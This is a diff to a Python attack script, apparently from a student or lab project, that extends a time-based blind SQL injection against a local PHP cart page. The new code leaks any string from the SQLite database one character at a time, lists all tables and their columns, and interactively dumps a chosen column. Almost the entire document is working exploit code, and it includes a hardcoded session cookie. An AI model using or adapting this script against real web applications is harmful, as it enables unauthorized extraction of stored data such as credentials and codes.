@@ -1,9 +1,8 @@
-#עופר ונוע צריך לחשוב הוא מוצא רק את הטבלה הראשונה ואת השורה הראשונה בטבלה הזאת
 import requests
 import time
 
 URL = "http://localhost/CyberProject/cart.php"
-COOKIES = {'PHPSESSID': 'u7bghf1trl27i70ugtmh02m5m8'}
+COOKIES = {'PHPSESSID': '82reb4vqs953kqhnm8ull3r0am'}
 ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#"
 
 def get_baseline():
@@ -33,67 +32,106 @@ def check_condition_time(payload, baseline):
     except Exception as e:
         return False
 
-def discover_table_name(baseline):
-    print("[+] Discovering table name from sqlite_master...")
-    table_name = ""
-    pos = 1
-    
-    while True:
-        found_char = False
-        for char in ALPHABET:
-            payload = f"UPPER(SUBSTR((SELECT name FROM sqlite_master WHERE type='table' LIMIT 1), {pos}, 1)) = '{char}'"
-            if check_condition_time(payload, baseline):
-                table_name += char
-                print(f"[TABLE ENUM] Position {pos}: {char} -> {table_name}")
-                found_char = True
-                break
-        
-        if not found_char:
-            break
-        pos += 1
-    return table_name
-
-def leak_data_unlimited(table, column, baseline):
+def leak_string(source_query, baseline, label):
+    """Generic char-by-char leaker: source_query must be a SELECT that returns ONE string."""
     discovered = ""
     pos = 1
-    print(f"\n[+] Starting Attack on {table}.{column}...")
-
     while True:
         found_char = False
         for char in ALPHABET:
-            payload = f"UPPER(SUBSTR((SELECT {column} FROM {table} LIMIT 1), {pos}, 1)) = '{char}'"
+            payload = f"UPPER(SUBSTR(({source_query}), {pos}, 1)) = '{char}'"
             if check_condition_time(payload, baseline):
                 discovered += char
-                print(f"[DATA ENUM] Position {pos}: {char} -> Current: {discovered}")
+                print(f"  [{label}] pos {pos}: {char} -> {discovered}")
                 found_char = True
                 break
-        
         if not found_char:
-            print(f"[+] End of string reached at position {pos}.")
             break
         pos += 1
-            
     return discovered
+
+
+def discover_all_tables(baseline):
+    print("[+] Enumerating ALL table names from sqlite_master...")
+    tables = []
+    offset = 0
+    while True:
+        source = (
+            f"SELECT name FROM sqlite_master WHERE type='table' "
+            f"LIMIT 1 OFFSET {offset}"
+        )
+        name = leak_string(source, baseline, f"TABLE {offset}")
+        if not name:
+            break
+        tables.append(name)
+        offset += 1
+    return tables
+
+
+def discover_columns(table, baseline):
+    print(f"[+] Enumerating columns of '{table}' via pragma_table_info...")
+    columns = []
+    offset = 0
+    while True:
+        # pragma_table_info is a table-valued function in SQLite; the table name
+        # is a literal so we can plug the discovered name in directly.
+        source = (
+            f"SELECT name FROM pragma_table_info('{table}') "
+            f"LIMIT 1 OFFSET {offset}"
+        )
+        name = leak_string(source, baseline, f"COL {offset}")
+        if not name:
+            break
+        columns.append(name)
+        offset += 1
+    return columns
+
+
+def leak_data_unlimited(table, column, baseline):
+    print(f"\n[+] Dumping first row of {table}.{column}...")
+    source = f"SELECT {column} FROM {table} LIMIT 1"
+    return leak_string(source, baseline, "DATA")
+
+
+def pick_from(items, prompt):
+    for i, name in enumerate(items):
+        print(f"  [{i}] {name}")
+    raw = input(prompt).strip()
+    if not raw.isdigit() or not (0 <= int(raw) < len(items)):
+        return None
+    return items[int(raw)]
+
 
 if __name__ == "__main__":
     baseline_time = get_baseline()
-    if baseline_time == 0: baseline_time = 0.1
+    if baseline_time == 0:
+        baseline_time = 0.1
     print(f"[+] Baseline: {baseline_time:.2f}s. Threshold: {(baseline_time + 0.5):.2f}s")
 
-    table_name = discover_table_name(baseline_time)
-    
-    if table_name:
-        print(f"\n[!] Success! Found table: {table_name}")
-        choice = input(f"Do you want to extract data from table '{table_name}'? (Y/N): ").strip().upper()
-        
-        if choice == 'Y':
-            extracted = leak_data_unlimited(table_name, "encrypted_code", baseline_time)
-            
-            if extracted:
-                print(f"\n[SUCCESS] Final Data Discovered: {extracted}")
-            else:
-                print("\n[!] Failed to extract data content.")
-        else:
-            print("\n[.] Attack aborted by user.")
+    tables = discover_all_tables(baseline_time)
+    if not tables:
+        print("\n[!] Failed to discover any tables.")
+        raise SystemExit(1)
+
+    print(f"\n[!] Discovered {len(tables)} table(s): {', '.join(tables)}")
+    target_table = pick_from(tables, "Pick a table index to enumerate (or anything else to quit): ")
+    if not target_table:
+        print("\n[.] Attack aborted by user.")
+        raise SystemExit(0)
+
+    columns = discover_columns(target_table, baseline_time)
+    if not columns:
+        print(f"\n[!] No columns discovered for '{target_table}'.")
+        raise SystemExit(1)
+
+    print(f"\n[!] '{target_table}' columns: {', '.join(columns)}")
+    target_column = pick_from(columns, "Pick a column index to dump (or anything else to quit): ")
+    if not target_column:
+        print("\n[.] Attack aborted by user.")
+        raise SystemExit(0)
+
+    extracted = leak_data_unlimited(target_table, target_column, baseline_time)
+    if extracted:
+        print(f"\n[SUCCESS] {target_table}.{target_column}[0] = {extracted}")
     else:
-        print("\n[!] Failed to discover table name.")
+        print("\n[!] Failed to extract data content.")
